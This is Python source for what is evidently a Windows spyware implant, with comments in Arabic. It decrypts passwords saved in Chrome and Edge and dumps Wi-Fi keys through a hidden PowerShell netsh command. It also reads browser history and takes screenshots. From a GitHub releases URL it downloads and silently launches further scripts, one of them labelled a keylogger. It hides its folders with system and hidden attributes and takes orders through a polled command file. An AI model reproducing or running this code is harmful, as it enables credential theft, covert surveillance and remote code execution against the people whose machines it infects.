import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab
import requests
import runpy
import threading
from pathlib import Path
import os
import requests
import subprocess
from pathlib import Path
import time
from PIL import ImageGrab
import pygetwindow as gw
import os, time
CREATE_NO_WINDOW = 0x08000000
import requests
import runpy
import threading
from pathlib import Path








# إعدادات القناة الثابتة
BASE_DIR = r"C:\ProgramData\WinExec"
CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
RES_FILE = os.path.join(BASE_DIR, "res.txt")
SS_FILE = os.path.join(BASE_DIR, "ss.png")

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except: return None

def decrypt_password(buff, m_key):
    try:
        cipher = AES.new(m_key, AES.MODE_GCM, buff[3:15])
        return cipher.decrypt(buff[15:])[:-16].decode()
    except: return f"Hash: {base64.b64encode(buff).decode()}"

def run_passwords():
    out = ""
    user_p = os.path.expanduser('~')
    browsers = {"Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data", "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data"}
    for name, path in browsers.items():
        db, st = path + r"\Default\Login Data", path + r"\Local State"
        if os.path.exists(db):
            out += f"\n--- {name} Passwords ---\n"
            try:
                m_key = get_master_key(st)
                tmp = os.path.join(os.environ["TEMP"], "tmp_p.db")
                shutil.copyfile(db, tmp)
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cur.fetchall():
                    if row[1].strip():
                        out += f"🌐 Site: {row[0]}\n📧 User: {row[1]}\n🔑 Pass: {decrypt_password(row[2], m_key)}\n---\n"
                conn.close(); os.remove(tmp)
            except Exception as e: out += f"Err {name}: {e}\n"
    return out or "No Passwords Found."

def run_wifi():
    try:
        # هذا الأمر يجلب كل الشبكات وكلمات السر دفعة واحدة
        cmd = 'netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = $_.ToString().Split(":")[1].Trim(); $key = (netsh wlan show profile name=$name key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim(); "SSID: $name | Pass: $key" }'

        
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True,
            text=True,
            encoding="cp850",
            creationflags=CREATE_NO_WINDOW
        ).stdout
        return res if res.strip() else "No WiFi profiles found."
    except:
        return "⚠️ Error retrieving WiFi or No saved networks."

def run_history():
    out = ""
    user_p = os.path.expanduser('~')
    paths = {"Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History", "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History"}
    for b, p in paths.items():
        if os.path.exists(p):
            out += f"--- {b} History ---\n"
            tmp = os.path.join(os.environ["TEMP"], "h_tmp")
            shutil.copyfile(p, tmp)
            try:
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC LIMIT 15")
                for r in cur.fetchall(): out += f"🔹 {r[0][:50]}\n🔗 {r[1]}\n\n"
                conn.close(); os.remove(tmp)
            except: pass
    return out



# --- إعداد المسارات ---
CROSSMOS_PATH = Path(r"C:\ProgramData\WinCore\wincore.py")
CROSSMOS_URL  = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/wincore.py"
PYTHON_EXEC   = Path(r"C:\ProgramData\WinCore\pywin.exe")

def update():
    try:
        # حذف CMD_FILE لتجنب التكرار
        if os.path.exists(CMD_FILE):
            os.remove(CMD_FILE)
        # 1️⃣ حذف الملف القديم إذا كان موجودًا
        if CROSSMOS_PATH.exists():
            CROSSMOS_PATH.unlink()
            print("[+] Deleted old crossmos.py")

        # 2️⃣ تحميل النسخة الجديدة
        r = requests.get(CROSSMOS_URL, timeout=30)
        if r.status_code != 200 or len(r.content) < 100:
            print("[!] Failed to download the new crossmos.py")
            return

        # كتابة الملف الجديد في المسار المناسب
        with open(CROSSMOS_PATH, "wb") as f:
            f.write(r.content)
        print("[+] Downloaded new crossmos.py successfully")

        # 3️⃣ تشغيل crossmos.py باستخدام python_platform.exe بصمت
        subprocess.Popen(
            [str(PYTHON_EXEC), str(CROSSMOS_PATH)],
            cwd=str(CROSSMOS_PATH.parent),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
        print("[+] crossmos.py launched successfully")

    except Exception as e:
        print(f"[!] Update failed: {e}")


# الإعدادات العامة
BASE_DIR = r"C:\ProgramData\SysKey"
SCRIPT_NAME = "syskey.py"
LOCAL_PYTHON_NAME = "pwiny.exe"
SOURCE_PYTHON = r"C:\ProgramData\WinCore\pywin.exe"
GITHUB_URL = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/syskey.py"

def download_and_run():
    try:
        if not os.path.exists(BASE_DIR):
            os.makedirs(BASE_DIR)

        script_path = os.path.join(BASE_DIR, SCRIPT_NAME)
        local_python_path = os.path.join(BASE_DIR, LOCAL_PYTHON_NAME)

        # 1. تجهيز المحرك (الـ EXE المحلي)
        if not os.path.exists(local_python_path) and os.path.exists(SOURCE_PYTHON):
            shutil.copy2(SOURCE_PYTHON, local_python_path)

        # 2. تحميل السكربت
        r = requests.get(GITHUB_URL, timeout=10)
        r.raise_for_status()
        with open(script_path, "wb") as f:
            f.write(r.content)

        # 3. التشغيل في الخلفية (صامت تماماً)
        # نستخدم start_new_session لضمان انفصال العملية عن السكربت الحالي
        subprocess.Popen(
            [local_python_path, script_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        return "DOWNLOAD_AND_RUN_SUCCESS"
    except Exception as e:
        return f"ERROR: {str(e)}"

def remove_script():
    try:
        # 1. قتل العمليات فوراً باستخدام taskkill لمرة واحدة وبشكل صامت
        # نقتل pwiny.exe الذي هو المحرك المشغل للسكربت
        subprocess.run(
            ["taskkill", "/F", "/IM", LOCAL_PYTHON_NAME, "/T"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # انتظار بسيط للتأكد من إغلاق ملفات النظام
        time.sleep(2)

        # 2. حذف الملفات
        if os.path.exists(BASE_DIR):
            shutil.rmtree(BASE_DIR, ignore_errors=True)
            
        return "REMOVE_SUCCESS"
    except Exception as e:
        return f"ERROR_DURING_REMOVE: {str(e)}"



FILES = {
    "winmon.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/winmon.py",
    "windef.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/windef.py"
}

BASE_DIR = Path(__file__).parent.resolve()


def ensure_file(filename, url):
    file_path = BASE_DIR / filename

    if not file_path.exists():
        print(f"[+] Downloading {filename} ...")
        r = requests.get(url, timeout=15)
        r.raise_for_status()
        file_path.write_bytes(r.content)
        print(f"[+] {filename} downloaded successfully.")
    else:
        print(f"[i] {filename} already exists.")

    return file_path


def run_script(path):
    print(f"[>] Starting {path.name}")
    runpy.run_path(str(path), run_name="__main__")


def startup():
    for filename, url in FILES.items():
        path = ensure_file(filename, url)
        t = threading.Thread(target=run_script, args=(path,), daemon=True)
        t.start()

if __name__ == "__main__":
    threading.Thread(target=startup, daemon=True).start()



import ctypes
import os
from pathlib import Path

# --- الإعدادات ---
# أضف هنا أي مسارات مجلدات خارجية تريد إخفاءها تماماً
EXTRA_TARGETS = [
    r"C:\ProgramData\WinCore",
    r"C:\ProgramData\WinExec"
]

def apply_deep_stealth(target_path):
    """
    تطبيق سمات النواة: مخفي + نظام + قراءة فقط + منع الفهرسة.
    تجعل الملف غير مرئي حتى مع تفعيل 'إظهار الملفات المخفية'.
    """
    try:
        # FILE_ATTRIBUTE_READONLY (0x01) | HIDDEN (0x02) | SYSTEM (0x04) | NOT_CONTENT_INDEXED (0x2000)
        attrs = 0x01 | 0x02 | 0x04 | 0x2000
        path_str = str(target_path)
        
        # التنفيذ عبر Windows API مباشرة
        success = ctypes.windll.kernel32.SetFileAttributesW(path_str, attrs)
        return success
    except Exception:
        return False

def protect_assets(target_dir):
    """تطبيق الإخفاء على المجلد وكل ما بداخله"""
    path = Path(target_dir)
    if not path.exists():
        return

    # 1. إخفاء كل الملفات داخل المجلد
    for item in path.rglob('*'): # rglob تجلب كل شيء في المجلدات الفرعية أيضاً
        apply_deep_stealth(item)
    
    # 2. إخفاء المجلد الرئيسي نفسه
    apply_deep_stealth(path)

def start_concealment_protocol():
    # المرحلة أ: إخفاء المجلد الحالي (الذي يحتوي على السكربت والملفات الأربعة)
    current_dir = Path(__file__).parent.resolve()
    print(f"[*] Concealing infrastructure at: {current_dir}")
    protect_assets(current_dir)

    # المرحلة ب: إخفاء المجلدات الخارجية المحددة في EXTRA_TARGETS
    for target in EXTRA_TARGETS:
        if os.path.exists(target):
            print(f"[*] Applying deep stealth to external target: {target}")
            protect_assets(target)
        else:
            print(f"[!] Target not found, skipping: {target}")

if __name__ == "__main__":
    # تشغيل البروتوكول
    start_concealment_protocol()


if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

while True:
    if os.path.exists(CMD_FILE):
        try:
            with open(CMD_FILE, "r") as f:
                cmd = f.read().strip()

            res = ""

            if cmd == "passwords":
                res = run_passwords()

            if cmd == "keylogger":
                res = download_and_run()


            if cmd == "rmkeylogger":
                res = remove_script()

            elif cmd == "wifi":
                res = run_wifi()

            elif cmd in ["history", "browser"]:
                res = run_history()

            elif cmd == "update":
                res = update()

            # 📸 Screenshot كامل الشاشة (كما هو بدون تغيير)
            elif cmd == "screenshot":
                ImageGrab.grab().save(SS_FILE)
                res = "SCREENSHOT_DONE"

            # 🎯 Screenshot للنافذة النشطة فقط (الجديد)
            elif cmd == "screenshot_active":
                window = gw.getActiveWindow()
                if window:
                    bbox = (window.left, window.top, window.right, window.bottom)
                    ImageGrab.grab(bbox=bbox).save(SS_FILE)
                    res = "SCREENSHOT_ACTIVE_DONE"
                else:
                    res = "NO_ACTIVE_WINDOW"

            with open(RES_FILE, "w", encoding="utf-8") as f:
                f.write(res)

            os.remove(CMD_FILE)  # مسح الطلب بعد التنفيذ
        

        except:
            pass

    time.sleep(1)

